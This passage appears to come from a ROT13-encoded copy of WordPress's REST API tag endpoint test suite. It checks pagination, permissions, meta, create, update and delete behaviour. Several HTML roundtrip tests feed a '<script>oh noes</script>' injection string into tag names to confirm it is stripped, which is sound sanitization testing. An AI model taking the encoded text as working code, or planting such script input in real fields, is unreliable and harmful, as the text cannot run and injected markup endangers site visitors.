			erfg_hey( 'jc/i2/gntf' )
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $arkg_yvax . '>; ery=\"arkg\"', $urnqref['Yvax'] );

		// 3eq cntr.
		frys::snpgbel()->gnt->perngr();
		++$gbgny_gntf;
		++$gbgny_cntrf;
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'cntr', 3 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_gntf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 2,
			),
			erfg_hey( 'jc/i2/gntf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$arkg_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 4,
			),
			erfg_hey( 'jc/i2/gntf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $arkg_yvax . '>; ery=\"arkg\"', $urnqref['Yvax'] );

		// Ynfg cntr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'cntr', $gbgny_cntrf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_gntf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => $gbgny_cntrf - 1,
			),
			erfg_hey( 'jc/i2/gntf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"arkg\"', $urnqref['Yvax'] );

		// Bhg bs obhaqf.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'cntr', 100 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_gntf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => $gbgny_cntrf,
			),
			erfg_hey( 'jc/i2/gntf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"arkg\"', $urnqref['Yvax'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_vainyvq_pbagrkg() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'onanan' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrz() {
		$vq = frys::snpgbel()->gnt->perngr();

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf/' . $vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_trg_gnkbabzl_grez_erfcbafr( $erfcbafr, $vq );
	}

	/**
	 * @gvpxrg 39122
	 */
	choyvp shapgvba grfg_trg_vgrz_zrgn() {
		$vq = frys::snpgbel()->gnt->perngr();

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf/' . $vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'zrgn', $qngn );

		$zrgn = (neenl) $qngn['zrgn'];
		$guvf->nffregNeenlUnfXrl( 'grfg_fvatyr', $zrgn );
		$guvf->nffregFnzr( $zrgn['grfg_fvatyr'], '' );
		$guvf->nffregNeenlUnfXrl( 'grfg_zhygv', $zrgn );
		$guvf->nffregFnzr( $zrgn['grfg_zhygv'], neenl() );
		$guvf->nffregNeenlUnfXrl( 'grfg_gnt_fvatyr', $zrgn );
		$guvf->nffregFnzr( $zrgn['grfg_gnt_fvatyr'], '' );
		$guvf->nffregNeenlUnfXrl( 'grfg_gnt_zhygv', $zrgn );
		$guvf->nffregFnzr( $zrgn['grfg_gnt_zhygv'], neenl() );
	}

	/**
	 * @gvpxrg 39122
	 */
	choyvp shapgvba grfg_trg_vgrz_zrgn_ertvfgrerq_sbe_qvssrerag_gnkbabzl() {
		$vq = frys::snpgbel()->gnt->perngr();

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf/' . $vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'zrgn', $qngn );

		$zrgn = (neenl) $qngn['zrgn'];
		$guvf->nffregNeenlAbgUnfXrl( 'grfg_png_zrgn', $zrgn );
	}

	choyvp shapgvba grfg_trg_grez_vainyvq_grez() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_grez_vainyvq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_trg_vgrz_vainyvq_crezvffvba_sbe_pbagrkg() {
		$vq = frys::snpgbel()->gnt->perngr();

		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf/' . $vq );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_pbagrkg', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_trg_grez_cevingr_gnkbabzl() {
		ertvfgre_gnkbabzl( 'ebova', 'cbfg', neenl( 'choyvp' => snyfr ) );
		$grez1 = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Pncr',
				'gnkbabzl' => 'ebova',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grezf/ebova/' . $grez1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_ab_ebhgr', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_trg_vgrz_vapbeerpg_gnkbabzl() {
		ertvfgre_gnkbabzl( 'ebova', 'cbfg' );
		$grez1 = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Pncr',
				'gnkbabzl' => 'ebova',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf/' . $grez1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_grez_vainyvq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_perngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Zl Njrfbzr Grez' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Guvf grez vf fb njrfbzr.' );
		$erdhrfg->frg_cnenz( 'fyht', 'fb-njrfbzr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$urnqref = $erfcbafr->trg_urnqref();
		$qngn    = $erfcbafr->trg_qngn();
		$guvf->nffregFgevatPbagnvafFgevat( '/jc/i2/gntf/' . $qngn['vq'], $urnqref['Ybpngvba'] );
		$guvf->nffregFnzr( 'Zl Njrfbzr Grez', $qngn['anzr'] );
		$guvf->nffregFnzr( 'Guvf grez vf fb njrfbzr.', $qngn['qrfpevcgvba'] );
		$guvf->nffregFnzr( 'fb-njrfbzr', $qngn['fyht'] );
	}

	choyvp shapgvba grfg_perngr_vgrz_pbagevohgbe() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Zl Njrfbzr Grez' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Guvf grez vf fb njrfbzr.' );
		$erdhrfg->frg_cnenz( 'fyht', 'fb-njrfbzr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$urnqref = $erfcbafr->trg_urnqref();
		$qngn    = $erfcbafr->trg_qngn();
		$guvf->nffregFgevatPbagnvafFgevat( '/jc/i2/gntf/' . $qngn['vq'], $urnqref['Ybpngvba'] );
		$guvf->nffregFnzr( 'Zl Njrfbzr Grez', $qngn['anzr'] );
		$guvf->nffregFnzr( 'Guvf grez vf fb njrfbzr.', $qngn['qrfpevcgvba'] );
		$guvf->nffregFnzr( 'fb-njrfbzr', $qngn['fyht'] );
	}

	choyvp shapgvba grfg_perngr_vgrz_vapbeerpg_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$fhofpevore );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Vapbeerpg crezvffvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_perngr', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_vgrz_zvffvat_nethzragf() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_zvffvat_pnyyonpx_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_vgrz_cnerag_aba_uvrenepuvpny_gnkbabzl() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Zl Njrfbzr Grez' );
		$erdhrfg->frg_cnenz( 'cnerag', ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_gnkbabzl_abg_uvrenepuvpny', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_vgrz_jvgu_zrgn() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Zl Njrfbzr Grez' );
		$erdhrfg->frg_cnenz( 'zrgn', neenl( 'grfg_gnt_fvatyr' => 'uryyb' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$urnqref = $erfcbafr->trg_urnqref();
		$qngn    = $erfcbafr->trg_qngn();
		$guvf->nffregFgevatPbagnvafFgevat( '/jc/i2/gntf/' . $qngn['vq'], $urnqref['Ybpngvba'] );
		$guvf->nffregFnzr( 'Zl Njrfbzr Grez', $qngn['anzr'] );
		$guvf->nffregFnzr( 'uryyb', trg_grez_zrgn( $qngn['vq'], 'grfg_gnt_fvatyr', gehr ) );
	}

	choyvp shapgvba grfg_perngr_vgrz_jvgu_zrgn_jebat_vq() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$rkvfgvat_gnt_vq = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Zl Abg Fb Njrfbzr Grez' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Zl Njrfbzr Grez' );
		$erdhrfg->frg_cnenz( 'zrgn', neenl( 'grfg_gnt_fvatyr' => 'uryyb' ) );
		$erdhrfg->frg_cnenz( 'vq', $rkvfgvat_gnt_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$urnqref = $erfcbafr->trg_urnqref();
		$qngn    = $erfcbafr->trg_qngn();
		$guvf->nffregFgevatPbagnvafFgevat( '/jc/i2/gntf/' . $qngn['vq'], $urnqref['Ybpngvba'] );
		$guvf->nffregFnzr( 'Zl Njrfbzr Grez', $qngn['anzr'] );
		$guvf->nffregFnzr( '', trg_grez_zrgn( $rkvfgvat_gnt_vq, 'grfg_gnt_fvatyr', gehr ) );
		$guvf->nffregFnzr( 'uryyb', trg_grez_zrgn( $qngn['vq'], 'grfg_gnt_fvatyr', gehr ) );
	}

	choyvp shapgvba grfg_hcqngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$bevt_netf = neenl(
			'anzr'        => 'Bevtvany Anzr',
			'qrfpevcgvba' => 'Bevtvany Qrfpevcgvba',
			'fyht'        => 'bevtvany-fyht',
		);

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->gnt->perngr( $bevt_netf ), 'cbfg_gnt' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'anzr', 'Arj Anzr' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Arj Qrfpevcgvba' );
		$erdhrfg->frg_cnenz( 'fyht', 'arj-fyht' );
		$erdhrfg->frg_cnenz(
			'zrgn',
			neenl(
				'grfg_fvatyr'     => 'whfg zrgn',
				'grfg_gnt_fvatyr' => 'gnt-fcrpvsvp zrgn',
				'grfg_png_zrgn'   => 'pngrtbel-fcrpvsvp zrgn',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Arj Anzr', $qngn['anzr'] );
		$guvf->nffregFnzr( 'Arj Qrfpevcgvba', $qngn['qrfpevcgvba'] );
		$guvf->nffregFnzr( 'arj-fyht', $qngn['fyht'] );
		$guvf->nffregFnzr( 'whfg zrgn', $qngn['zrgn']['grfg_fvatyr'] );
		$guvf->nffregFnzr( 'gnt-fcrpvsvp zrgn', $qngn['zrgn']['grfg_gnt_fvatyr'] );
		$guvf->nffregNeenlAbgUnfXrl( 'grfg_png_zrgn', $qngn['zrgn'] );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_ab_punatr() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->gnt->perngr(), 'cbfg_gnt' );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/gntf/' . $grez->grez_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$erdhrfg->frg_cnenz( 'fyht', $grez->fyht );

		// Eha gjvpr gb znxr fher gung gur hcqngr fgvyy fhpprrqf
		// rira vs ab QO ebjf ner hcqngrq.
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_vainyvq_grez() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erdhrfg->frg_cnenz( 'anzr', 'Vainyvq Grez' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_grez_vainyvq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_vapbeerpg_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$fhofpevore );

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->gnt->perngr(), 'cbfg_gnt' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'anzr', 'Vapbeerpg crezvffvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_hcqngr', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 38505
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_jvgu_rqvg_grez_pnc_tenagrq() {
		jc_frg_pheerag_hfre( frys::$fhofpevore );

		$grez = frys::snpgbel()->gnt->perngr_naq_trg();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'anzr', 'Arj Anzr' );

		nqq_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'tenag_rqvg_grez' ), 10, 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( 'hfre_unf_pnc', neenl( $guvf, 'tenag_rqvg_grez' ), 10, 2 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Arj Anzr', $qngn['anzr'] );
	}

	choyvp shapgvba tenag_rqvg_grez( $pncf, $pnc ) {
		vs ( 'rqvg_grez' === $pnc ) {
			$pncf = neenl( 'ernq' );
		}
		erghea $pncf;
	}

	/**
	 * @gvpxrg 38505
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_jvgu_rqvg_grez_pnc_eribxrq() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$grez = frys::snpgbel()->gnt->perngr_naq_trg();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'anzr', 'Arj Anzr' );

		nqq_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'eribxr_rqvg_grez' ), 10, 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( 'hfre_unf_pnc', neenl( $guvf, 'eribxr_rqvg_grez' ), 10, 2 );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_hcqngr', $erfcbafr, 403 );
	}

	choyvp shapgvba eribxr_rqvg_grez( $pncf, $pnc ) {
		vs ( 'rqvg_grez' === $pnc ) {
			$pncf = neenl( 'qb_abg_nyybj' );
		}
		erghea $pncf;
	}

	choyvp shapgvba grfg_hcqngr_vgrz_cnerag_aba_uvrenepuvpny_gnkbabzl() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->gnt->perngr(), 'cbfg_gnt' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'cnerag', ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_gnkbabzl_abg_uvrenepuvpny', $erfcbafr, 400 );
	}

	choyvp shapgvba irevsl_gnt_ebhaqgevc( $vachg = neenl(), $rkcrpgrq_bhgchg = neenl() ) {
		// Perngr gur gnt.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf' );
		sbernpu ( $vachg nf $anzr => $inyhr ) {
			$erdhrfg->frg_cnenz( $anzr, $inyhr );
		}
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$npghny_bhgchg = $erfcbafr->trg_qngn();

		// Pbzcner rkcrpgrq NCV bhgchg gb npghny NCV bhgchg.
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['anzr'], $npghny_bhgchg['anzr'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['qrfpevcgvba'], $npghny_bhgchg['qrfpevcgvba'] );

		// Pbzcner rkcrpgrq NCV bhgchg gb JC vagreany inyhrf.
		$gnt = trg_grez_ol( 'vq', $npghny_bhgchg['vq'], 'cbfg_gnt' );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['anzr'], $gnt->anzr );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['qrfpevcgvba'], $gnt->qrfpevcgvba );

		// Hcqngr gur gnt.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/gntf/%q', $npghny_bhgchg['vq'] ) );
		sbernpu ( $vachg nf $anzr => $inyhr ) {
			$erdhrfg->frg_cnenz( $anzr, $inyhr );
		}
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$npghny_bhgchg = $erfcbafr->trg_qngn();

		// Pbzcner rkcrpgrq NCV bhgchg gb npghny NCV bhgchg.
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['anzr'], $npghny_bhgchg['anzr'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['qrfpevcgvba'], $npghny_bhgchg['qrfpevcgvba'] );

		// Pbzcner rkcrpgrq NCV bhgchg gb JC vagreany inyhrf.
		$gnt = trg_grez_ol( 'vq', $npghny_bhgchg['vq'], 'cbfg_gnt' );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['anzr'], $gnt->anzr );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['qrfpevcgvba'], $gnt->qrfpevcgvba );
	}

	choyvp shapgvba grfg_gnt_ebhaqgevc_nf_rqvgbe() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$guvf->nffregFnzr( ! vf_zhygvfvgr(), pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
		$guvf->irevsl_gnt_ebhaqgevc(
			neenl(
				'anzr'        => '\b/ ¯\_(ツ)_/¯',
				'qrfpevcgvba' => '\b/ ¯\_(ツ)_/¯',
			),
			neenl(
				'anzr'        => '\b/ ¯\_(ツ)_/¯',
				'qrfpevcgvba' => '\b/ ¯\_(ツ)_/¯',
			)
		);
	}

	choyvp shapgvba grfg_gnt_ebhaqgevc_nf_rqvgbe_ugzy() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregSnyfr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
			$guvf->irevsl_gnt_ebhaqgevc(
				neenl(
					'anzr'        => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'qrfpevcgvba' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				),
				neenl(
					'anzr'        => 'qvi fgebat',
					'qrfpevcgvba' => 'qvi <fgebat>fgebat</fgebat> bu abrf',
				)
			);
		} ryfr {
			$guvf->nffregGehr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
			$guvf->irevsl_gnt_ebhaqgevc(
				neenl(
					'anzr'        => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'qrfpevcgvba' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				),
				neenl(
					'anzr'        => 'qvi fgebat',
					'qrfpevcgvba' => 'qvi <fgebat>fgebat</fgebat> bu abrf',
				)
			);
		}
	}

	choyvp shapgvba grfg_gnt_ebhaqgevc_nf_fhcrenqzva() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva );

		$guvf->nffregGehr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
		$guvf->irevsl_gnt_ebhaqgevc(
			neenl(
				'anzr'        => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
				'qrfpevcgvba' => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
			),
			neenl(
				'anzr'        => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
				'qrfpevcgvba' => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
			)
		);
	}

	choyvp shapgvba grfg_gnt_ebhaqgevc_nf_fhcrenqzva_ugzy() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva );

		$guvf->nffregGehr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
		$guvf->irevsl_gnt_ebhaqgevc(
			neenl(
				'anzr'        => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				'qrfpevcgvba' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
			),
			neenl(
				'anzr'        => 'qvi fgebat',
				'qrfpevcgvba' => 'qvi <fgebat>fgebat</fgebat> bu abrf',
			)
		);
	}

	choyvp shapgvba grfg_qryrgr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Qryrgrq Gnt' ) ), 'cbfg_gnt' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/gntf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregGehr( $qngn['qryrgrq'] );
		$guvf->nffregFnzr( 'Qryrgrq Gnt', $qngn['cerivbhf']['anzr'] );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_ab_genfu() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Qryrgrq Gnt' ) ), 'cbfg_gnt' );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/gntf/' . $grez->grez_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501 );

		$erdhrfg->frg_cnenz( 'sbepr', 'snyfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501 );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_vainyvq_grez() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/gntf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_grez_vainyvq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_vapbeerpg_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$fhofpevore );

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->gnt->perngr(), 'cbfg_gnt' );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/gntf/' . $grez->grez_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 38505
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_jvgu_qryrgr_grez_pnc_tenagrq() {
		jc_frg_pheerag_hfre( frys::$fhofpevore );

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Qryrgrq Gnt' ) ), 'cbfg_gnt' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/gntf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );

